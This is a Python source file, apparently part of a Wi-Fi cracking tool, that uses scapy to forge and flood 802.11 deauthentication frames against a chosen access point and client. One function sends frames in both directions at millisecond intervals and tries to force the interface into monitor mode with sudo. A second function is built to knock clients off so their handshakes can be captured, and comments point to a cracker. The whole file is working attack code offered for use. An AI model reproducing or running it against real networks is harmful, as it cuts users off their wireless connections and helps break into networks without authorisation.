import time
import os
import subprocess
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp


def _default_log(message):
    """Fallback log sink when no callback is injected (standalone / tests)."""
    print(message)


def deauth_worker(target_bssid, target_client, network_interface, count, interval, stop_signal):
    """Worker function for deauthentication attacks"""
    print(f"[Deauth Thread] Starting deauthentication against BSSID: {target_bssid}")

    # Check if running as root
    if os.geteuid() != 0:
        print("[Deauth Error] Not running as root. Packet injection requires root privileges.")
        print("[Deauth Error] Try running the application with sudo.")

        # Try to verify the interface is in monitor mode anyway
        try:
            iwconfig_output = subprocess.check_output(['iwconfig', network_interface],
                                                     stderr=subprocess.STDOUT,
                                                     universal_newlines=True)
            print(f"[Deauth Debug] Current interface state: {iwconfig_output}")

            if "Mode:Monitor" not in iwconfig_output:
                print(f"[Deauth Error] Interface {network_interface} is not in monitor mode")

                # Try one more time to set monitor mode
                try:
                    subprocess.run(['sudo', 'ip', 'link', 'set', network_interface, 'down'], check=True)
                    subprocess.run(['sudo', 'iw', 'dev', network_interface, 'set', 'type', 'monitor'], check=True)
                    subprocess.run(['sudo', 'ip', 'link', 'set', network_interface, 'up'], check=True)
                    print(f"[Deauth Debug] Attempted to set {network_interface} to monitor mode")
                except Exception as e:
                    print(f"[Deauth Error] Failed to set monitor mode: {e}")
        except Exception as e:
            print(f"[Deauth Error] Could not check interface mode: {e}")

        stop_signal.set()
        return

    # Print test packet details
    print(f"[Deauth Thread] Targeting BSSID: {target_bssid}, Client: {target_client}")
    print(f"[Deauth Thread] Using interface: {network_interface}")
    print(f"[Deauth Thread] Packets per burst: {count}, Interval: {interval}s")

    # Craft both direction packets like in cracker (more reliable)
    # Deauth from AP to client
    dot11_to_client = Dot11(addr1=target_client, addr2=target_bssid, addr3=target_bssid)
    deauth_frame_to_client = RadioTap()/dot11_to_client/Dot11Deauth(reason=7)

    # Deauth from client to AP
    dot11_to_ap = Dot11(addr1=target_bssid, addr2=target_client, addr3=target_client)
    deauth_frame_to_ap = RadioTap()/dot11_to_ap/Dot11Deauth(reason=7)

    # Use same aggressive timing as cracker
    deauth_count = 0
    max_errors = 5
    consecutive_errors = 0

    while not stop_signal.is_set():
        try:
            # Send bursts to both client and AP
            sendp([deauth_frame_to_client, deauth_frame_to_ap],
                  iface=network_interface,
                  count=count,
                  inter=0.001,  # 1ms between packets
                  verbose=False)

            deauth_count += 1
            if deauth_count % 10 == 0:
                print(f"[Deauth Thread] Sent {deauth_count * count * 2} deauth packets...")

            consecutive_errors = 0  # Reset error counter on success
            stop_signal.wait(interval)

        except Exception as e:
            print(f"[Deauth Error] {e}")
            consecutive_errors += 1

            # On first error, try to check interface
            if consecutive_errors == 1:
                try:
                    iwconfig_output = subprocess.check_output(['iwconfig', network_interface],
                                                            stderr=subprocess.STDOUT,
                                                            universal_newlines=True)
                    print(f"[Deauth Debug] Interface state: {iwconfig_output}")
                except Exception as check_err:
                    print(f"[Deauth Error] Could not check interface: {check_err}")

            if consecutive_errors >= max_errors:
                print(f"[Deauth Thread] Too many consecutive errors ({consecutive_errors}). Stopping.")
                stop_signal.set()
            else:
                # Wait a bit longer before retrying after an error
                stop_signal.wait(interval * 2)

    print("[Deauth Thread] Stopped.")


def deauth_worker_for_handshake(target_bssid, target_client, network_interface, count, interval, stop_signal, log=None):
    """Sends deauthentication packets in a loop until stop_signal is set.

    ``log`` is an injected callback (message -> None); defaults to printing when absent.
    """
    log = log or _default_log
    log(f"[Deauth Thread] Starting deauthentication against BSSID: {target_bssid} on {network_interface}")
    dot11 = Dot11(type=0, subtype=12, addr1=target_client, addr2=target_bssid, addr3=target_bssid)
    deauth_frame_to_client = RadioTap() / dot11 / Dot11Deauth(reason=7)

    while not stop_signal.is_set():
        try:
            # print(f"[Deauth Thread] Sending {count} deauth packets...") # Can be noisy
            sendp(deauth_frame_to_client, iface=network_interface, count=count, inter=0.005, verbose=False)
            stop_signal.wait(interval)
        except OSError as e:
            log(f"[Deauth Thread] Error sending packets: {e}. Stopping deauth.")
            log("[Deauth Thread] Ensure the interface is in monitor mode and up.")
            stop_signal.set()
            break
        except Exception as e:
            log(f"[Deauth Thread] An unexpected error occurred: {e}")
            time.sleep(1)

    print("[Deauth Thread] Stopped.")
